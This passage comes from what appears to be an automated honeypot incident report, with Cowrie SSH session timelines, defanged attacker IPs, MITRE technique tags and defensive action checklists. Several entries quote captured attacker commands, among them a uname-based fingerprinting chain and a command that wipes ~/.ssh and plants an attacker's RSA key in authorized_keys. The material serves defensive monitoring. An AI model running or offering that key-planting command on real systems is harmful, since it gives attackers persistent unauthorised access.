| `2026-07-04 05:03:15` | `cowrie.client.kex` |
| `2026-07-04 05:03:15` | `cowrie.login.success` |
| `2026-07-04 05:03:16` | `cowrie.session.params` |
| `2026-07-04 05:03:16` | `cowrie.command.input` |
| `2026-07-04 05:03:16` | `cowrie.command.input` |
| `2026-07-04 05:03:16` | `cowrie.command.input` |
| `2026-07-04 05:03:16` | `cowrie.command.input` |
| `2026-07-04 05:03:16` | `cowrie.command.input` |
| `2026-07-04 05:03:16` | `cowrie.command.success` |
| `2026-07-04 05:03:16` | `cowrie.command.input` |
| `2026-07-04 05:03:16` | `cowrie.command.input` |
| `2026-07-04 05:03:16` | `cowrie.command.input` |
| `2026-07-04 05:03:16` | `cowrie.command.input` |
| `2026-07-04 05:03:16` | `cowrie.log.closed` |
| `2026-07-04 05:03:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d78af993f792

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 05:03 |
| **Last Seen** | 2026-07-04 05:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:03:31` | `cowrie.session.connect` |
| `2026-07-04 05:03:31` | `cowrie.client.version` |
| `2026-07-04 05:03:31` | `cowrie.client.kex` |
| `2026-07-04 05:03:32` | `cowrie.login.success` |
| `2026-07-04 05:03:32` | `cowrie.direct-tcpip.request` |
| `2026-07-04 05:03:32` | `cowrie.direct-tcpip.data` |
| `2026-07-04 05:03:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4e8e19107c8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 05:04 |
| **Last Seen** | 2026-07-04 05:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:04:32` | `cowrie.session.connect` |
| `2026-07-04 05:04:32` | `cowrie.client.version` |
| `2026-07-04 05:04:32` | `cowrie.client.kex` |
| `2026-07-04 05:04:32` | `cowrie.login.success` |
| `2026-07-04 05:04:33` | `cowrie.session.params` |
| `2026-07-04 05:04:33` | `cowrie.command.input` |
| `2026-07-04 05:04:33` | `cowrie.command.input` |
| `2026-07-04 05:04:33` | `cowrie.command.input` |
| `2026-07-04 05:04:33` | `cowrie.command.input` |
| `2026-07-04 05:04:33` | `cowrie.command.input` |
| `2026-07-04 05:04:33` | `cowrie.command.success` |
| `2026-07-04 05:04:33` | `cowrie.command.input` |
| `2026-07-04 05:04:33` | `cowrie.command.input` |
| `2026-07-04 05:04:33` | `cowrie.command.input` |
| `2026-07-04 05:04:33` | `cowrie.command.input` |
| `2026-07-04 05:04:33` | `cowrie.log.closed` |
| `2026-07-04 05:04:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-595739e46d3b

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-04 05:06 |
| **Last Seen** | 2026-07-04 05:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:06:30` | `cowrie.session.connect` |
| `2026-07-04 05:06:30` | `cowrie.client.version` |
| `2026-07-04 05:06:30` | `cowrie.client.kex` |
| `2026-07-04 05:06:30` | `cowrie.login.success` |
| `2026-07-04 05:06:31` | `cowrie.session.params` |
| `2026-07-04 05:06:31` | `cowrie.command.input` |
| `2026-07-04 05:06:31` | `cowrie.log.closed` |
| `2026-07-04 05:06:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7065e63e60bc

| Field | Detail |
|---|---|
| **Source IP** | `34.78.25[.]99` |
| **First Seen** | 2026-07-04 05:07 |
| **Last Seen** | 2026-07-04 05:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:07:39` | `cowrie.session.connect` |
| `2026-07-04 05:07:39` | `cowrie.login.success` |
| `2026-07-04 05:07:39` | `cowrie.session.params` |
| `2026-07-04 05:07:39` | `cowrie.command.input` |
| `2026-07-04 05:07:39` | `cowrie.command.input` |
| `2026-07-04 05:07:39` | `cowrie.command.failed` |
| `2026-07-04 05:07:39` | `cowrie.command.input` |
| `2026-07-04 05:07:40` | `cowrie.log.closed` |
| `2026-07-04 05:07:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.25[.]99` to AbuseIPDB if not already reported
- [ ] Block `34.78.25[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84864d5298d2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 05:07 |
| **Last Seen** | 2026-07-04 05:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:07:46` | `cowrie.session.connect` |
| `2026-07-04 05:07:46` | `cowrie.client.version` |
| `2026-07-04 05:07:47` | `cowrie.client.kex` |
| `2026-07-04 05:07:47` | `cowrie.login.success` |
| `2026-07-04 05:07:48` | `cowrie.session.params` |
| `2026-07-04 05:07:48` | `cowrie.command.input` |
| `2026-07-04 05:07:48` | `cowrie.command.input` |
| `2026-07-04 05:07:48` | `cowrie.command.input` |
| `2026-07-04 05:07:48` | `cowrie.command.input` |
| `2026-07-04 05:07:48` | `cowrie.command.input` |
| `2026-07-04 05:07:48` | `cowrie.command.success` |
| `2026-07-04 05:07:48` | `cowrie.command.input` |
| `2026-07-04 05:07:48` | `cowrie.command.input` |
| `2026-07-04 05:07:48` | `cowrie.command.input` |
| `2026-07-04 05:07:48` | `cowrie.command.input` |
| `2026-07-04 05:07:48` | `cowrie.log.closed` |
| `2026-07-04 05:07:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8451e896dff

| Field | Detail |
|---|---|
| **Source IP** | `34.78.25[.]99` |
| **First Seen** | 2026-07-04 05:07 |
| **Last Seen** | 2026-07-04 05:08 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:07:48` | `cowrie.session.connect` |
| `2026-07-04 05:07:48` | `cowrie.login.success` |
| `2026-07-04 05:07:48` | `cowrie.session.params` |
| `2026-07-04 05:07:48` | `cowrie.command.input` |
| `2026-07-04 05:07:49` | `cowrie.command.failed` |
| `2026-07-04 05:08:03` | `cowrie.log.closed` |
| `2026-07-04 05:08:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.25[.]99` to AbuseIPDB if not already reported
- [ ] Block `34.78.25[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbfcdb77b814

| Field | Detail |
|---|---|
| **Source IP** | `34.78.25[.]99` |
| **First Seen** | 2026-07-04 05:07 |
| **Last Seen** | 2026-07-04 05:08 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:07:50` | `cowrie.session.connect` |
| `2026-07-04 05:07:50` | `cowrie.login.success` |
| `2026-07-04 05:07:51` | `cowrie.session.params` |
| `2026-07-04 05:07:51` | `cowrie.command.input` |
| `2026-07-04 05:08:04` | `cowrie.log.closed` |
| `2026-07-04 05:08:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.25[.]99` to AbuseIPDB if not already reported
- [ ] Block `34.78.25[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c6cee40ce44

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 05:09 |
| **Last Seen** | 2026-07-04 05:09 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:09:38` | `cowrie.session.connect` |
| `2026-07-04 05:09:41` | `cowrie.client.version` |
| `2026-07-04 05:09:41` | `cowrie.client.kex` |
| `2026-07-04 05:09:47` | `cowrie.login.success` |
| `2026-07-04 05:09:51` | `cowrie.session.params` |
| `2026-07-04 05:09:51` | `cowrie.command.input` |
| `2026-07-04 05:09:53` | `cowrie.log.closed` |
| `2026-07-04 05:09:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a2462af3aa5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 05:10 |
| **Last Seen** | 2026-07-04 05:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:10:07` | `cowrie.session.connect` |
| `2026-07-04 05:10:07` | `cowrie.client.version` |
| `2026-07-04 05:10:07` | `cowrie.client.kex` |
| `2026-07-04 05:10:07` | `cowrie.login.success` |
| `2026-07-04 05:10:08` | `cowrie.session.params` |
| `2026-07-04 05:10:08` | `cowrie.command.input` |
| `2026-07-04 05:10:08` | `cowrie.command.input` |
| `2026-07-04 05:10:08` | `cowrie.command.input` |
| `2026-07-04 05:10:08` | `cowrie.command.input` |
| `2026-07-04 05:10:08` | `cowrie.command.input` |
| `2026-07-04 05:10:08` | `cowrie.command.success` |
| `2026-07-04 05:10:08` | `cowrie.command.input` |
| `2026-07-04 05:10:08` | `cowrie.command.input` |
| `2026-07-04 05:10:08` | `cowrie.command.input` |
| `2026-07-04 05:10:08` | `cowrie.command.input` |
| `2026-07-04 05:10:08` | `cowrie.log.closed` |
| `2026-07-04 05:10:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a071287dcc33

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 05:12 |
| **Last Seen** | 2026-07-04 05:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:12:00` | `cowrie.session.connect` |
| `2026-07-04 05:12:00` | `cowrie.client.version` |
| `2026-07-04 05:12:00` | `cowrie.client.kex` |
| `2026-07-04 05:12:00` | `cowrie.login.success` |
| `2026-07-04 05:12:01` | `cowrie.session.params` |
| `2026-07-04 05:12:01` | `cowrie.command.input` |
| `2026-07-04 05:12:01` | `cowrie.command.input` |
| `2026-07-04 05:12:01` | `cowrie.command.input` |
| `2026-07-04 05:12:01` | `cowrie.command.input` |
| `2026-07-04 05:12:01` | `cowrie.command.input` |
| `2026-07-04 05:12:01` | `cowrie.command.success` |
| `2026-07-04 05:12:01` | `cowrie.command.input` |
| `2026-07-04 05:12:01` | `cowrie.command.input` |
| `2026-07-04 05:12:01` | `cowrie.command.input` |
| `2026-07-04 05:12:01` | `cowrie.command.input` |
| `2026-07-04 05:12:01` | `cowrie.log.closed` |
| `2026-07-04 05:12:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e474429fbe3

| Field | Detail |
|---|---|
| **Source IP** | `186.103.169[.]12` |
| **First Seen** | 2026-07-04 05:13 |
| **Last Seen** | 2026-07-04 05:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:13:02` | `cowrie.session.connect` |
| `2026-07-04 05:13:02` | `cowrie.client.version` |
| `2026-07-04 05:13:02` | `cowrie.client.kex` |
| `2026-07-04 05:13:02` | `cowrie.login.success` |
| `2026-07-04 05:13:03` | `cowrie.session.params` |
| `2026-07-04 05:13:03` | `cowrie.command.input` |
| `2026-07-04 05:13:03` | `cowrie.command.failed` |
| `2026-07-04 05:13:04` | `cowrie.log.closed` |
| `2026-07-04 05:13:04` | `cowrie.session.params` |
| `2026-07-04 05:13:04` | `cowrie.command.input` |
| `2026-07-04 05:13:04` | `cowrie.session.file_download` |
| `2026-07-04 05:13:04` | `cowrie.log.closed` |
| `2026-07-04 05:13:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.169[.]12` to AbuseIPDB if not already reported
- [ ] Block `186.103.169[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9e06b8d40f9

| Field | Detail |
|---|---|
| **Source IP** | `186.103.169[.]12` |
| **First Seen** | 2026-07-04 05:13 |
| **Last Seen** | 2026-07-04 05:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:13:05` | `cowrie.session.connect` |
| `2026-07-04 05:13:05` | `cowrie.client.version` |
| `2026-07-04 05:13:05` | `cowrie.client.kex` |
| `2026-07-04 05:13:05` | `cowrie.login.success` |
| `2026-07-04 05:13:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.169[.]12` to AbuseIPDB if not already reported
- [ ] Block `186.103.169[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cdd3702f0b0

| Field | Detail |
|---|---|
| **Source IP** | `186.103.169[.]12` |
| **First Seen** | 2026-07-04 05:13 |
| **Last Seen** | 2026-07-04 05:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:13:05` | `cowrie.session.connect` |
| `2026-07-04 05:13:05` | `cowrie.client.version` |
| `2026-07-04 05:13:06` | `cowrie.client.kex` |
| `2026-07-04 05:13:06` | `cowrie.login.success` |
| `2026-07-04 05:13:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.169[.]12` to AbuseIPDB if not already reported
- [ ] Block `186.103.169[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14e28deca832

| Field | Detail |
|---|---|
| **Source IP** | `103.187.147[.]214` |
| **First Seen** | 2026-07-04 05:13 |
| **Last Seen** | 2026-07-04 05:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:13:21` | `cowrie.session.connect` |
| `2026-07-04 05:13:21` | `cowrie.client.version` |
| `2026-07-04 05:13:21` | `cowrie.client.kex` |
| `2026-07-04 05:13:22` | `cowrie.login.success` |
| `2026-07-04 05:13:23` | `cowrie.session.params` |
| `2026-07-04 05:13:23` | `cowrie.command.input` |
| `2026-07-04 05:13:23` | `cowrie.command.failed` |
| `2026-07-04 05:13:23` | `cowrie.log.closed` |
| `2026-07-04 05:13:24` | `cowrie.session.params` |
| `2026-07-04 05:13:24` | `cowrie.command.input` |
| `2026-07-04 05:13:24` | `cowrie.session.file_download` |
| `2026-07-04 05:13:24` | `cowrie.log.closed` |
| `2026-07-04 05:13:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.187.147[.]214` to AbuseIPDB if not already reported
- [ ] Block `103.187.147[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55bd1005f36a

| Field | Detail |
|---|---|
| **Source IP** | `103.187.147[.]214` |
| **First Seen** | 2026-07-04 05:13 |
| **Last Seen** | 2026-07-04 05:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:13:25` | `cowrie.session.connect` |
| `2026-07-04 05:13:25` | `cowrie.client.version` |
| `2026-07-04 05:13:25` | `cowrie.client.kex` |
| `2026-07-04 05:13:26` | `cowrie.login.success` |
| `2026-07-04 05:13:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.187.147[.]214` to AbuseIPDB if not already reported
- [ ] Block `103.187.147[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8779a31bde39

| Field | Detail |
|---|---|
| **Source IP** | `103.187.147[.]214` |
| **First Seen** | 2026-07-04 05:13 |
| **Last Seen** | 2026-07-04 05:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:13:26` | `cowrie.session.connect` |
| `2026-07-04 05:13:26` | `cowrie.client.version` |
| `2026-07-04 05:13:27` | `cowrie.client.kex` |
| `2026-07-04 05:13:28` | `cowrie.login.success` |
| `2026-07-04 05:13:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.187.147[.]214` to AbuseIPDB if not already reported
- [ ] Block `103.187.147[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56ff621e55c2

| Field | Detail |
|---|---|
| **Source IP** | `163.7.8[.]79` |
| **First Seen** | 2026-07-04 05:13 |
| **Last Seen** | 2026-07-04 05:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:13:28` | `cowrie.session.connect` |
| `2026-07-04 05:13:28` | `cowrie.client.version` |
| `2026-07-04 05:13:28` | `cowrie.client.kex` |
| `2026-07-04 05:13:29` | `cowrie.login.success` |
| `2026-07-04 05:13:30` | `cowrie.session.params` |
| `2026-07-04 05:13:30` | `cowrie.command.input` |
| `2026-07-04 05:13:30` | `cowrie.command.failed` |
| `2026-07-04 05:13:31` | `cowrie.log.closed` |
| `2026-07-04 05:13:32` | `cowrie.session.params` |
| `2026-07-04 05:13:32` | `cowrie.command.input` |
| `2026-07-04 05:13:32` | `cowrie.session.file_download` |
| `2026-07-04 05:13:32` | `cowrie.log.closed` |
| `2026-07-04 05:13:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.8[.]79` to AbuseIPDB if not already reported
- [ ] Block `163.7.8[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8060048fd75d

| Field | Detail |
|---|---|
| **Source IP** | `163.7.8[.]79` |
| **First Seen** | 2026-07-04 05:13 |
| **Last Seen** | 2026-07-04 05:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:13:32` | `cowrie.session.connect` |
| `2026-07-04 05:13:32` | `cowrie.client.version` |
| `2026-07-04 05:13:32` | `cowrie.client.kex` |
